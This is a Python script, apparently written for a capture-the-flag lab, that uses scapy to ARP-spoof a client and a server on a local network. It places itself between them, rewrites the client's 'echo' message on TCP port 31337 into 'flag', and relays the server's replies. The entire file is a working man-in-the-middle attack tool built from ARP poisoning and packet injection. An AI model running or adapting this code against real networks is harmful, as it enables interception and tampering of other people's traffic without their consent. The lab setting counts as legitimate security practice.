#!/usr/bin/env python3
import socket
import threading
import time

from scapy.all import Raw, get_if_hwaddr, send, sendp, sniff, sr1, srp
from scapy.layers.inet import ICMP, IP, TCP, UDP
from scapy.layers.l2 import ARP, Ether, arp_mitm, getmacbyip

print("Start")

IP_CLIENT = "10.0.0.2"
IP_SERVER = "10.0.0.3"

INTERFACE = "eth0"

MAC_CLIENT = getmacbyip(IP_CLIENT)
MAC_SERVER = getmacbyip(IP_SERVER)
MAC_ATTACKER = get_if_hwaddr(INTERFACE)

if not MAC_CLIENT or not MAC_SERVER or not MAC_ATTACKER:
    print("[-] Error: Could not resolve target MACs.")
    exit(1)

def arp_spoofer():
    while True:
        # :param ip1: IPv4 of the first machine
        # :param ip2: IPv4 of the second machine
        # :param mac1: MAC of the first machine (optional: will ARP otherwise)
        # :param mac2: MAC of the second machine (optional: will ARP otherwise)
        # :param broadcast: if True, will use broadcast mac for MitM by default
        # :param target_mac: MAC of the attacker (optional: default to the interface's one)
        # :param iface: the network interface. (optional: default, route for ip1)
        arp_mitm(
            ip1=IP_CLIENT,
            ip2=IP_SERVER,
            mac1=MAC_CLIENT,
            mac2=MAC_SERVER,
            broadcast=True,
            target_mac=MAC_ATTACKER,
            iface=INTERFACE,
        )
        time.sleep(1)


def process_packet(pkt):
    if pkt.haslayer(IP) and pkt.haslayer(TCP):
        ip_pkt = pkt[IP].copy()

        # Client -> Server
        if (
            ip_pkt.src == "10.0.0.2"
            and ip_pkt.dst == "10.0.0.3"
            and ip_pkt[TCP].dport == 31337
        ):
            if ip_pkt.haslayer(Raw) and ip_pkt[Raw].load == b"echo":
                print("[*] Intercepted 'echo'. Injecting 'flag' payload...")
                ip_pkt[Raw].load = b"flag"

                del ip_pkt.len
                del ip_pkt.chksum
                del ip_pkt[TCP].chksum

            sendp(Ether(dst=MAC_SERVER) / ip_pkt, iface="eth0", verbose=False)

        # Server -> Client
        elif (
            ip_pkt.src == "10.0.0.3"
            and ip_pkt.dst == "10.0.0.2"
            and ip_pkt[TCP].sport == 31337
        ):
            if ip_pkt.haslayer(Raw):
                payload = ip_pkt[Raw].load
                print(f"[+] Server says: {payload.decode('utf-8', errors='ignore')}")

            sendp(Ether(dst=MAC_CLIENT) / ip_pkt, iface="eth0", verbose=False)


if __name__ == "__main__":
    print("[*] Loading...")

    spoof_thread = threading.Thread(target=arp_spoofer, daemon=True)
    spoof_thread.start()

    time.sleep(2)

    print("[*] Sniffer listening...")
    sniff(filter="tcp port 31337", prn=process_packet, store=0)
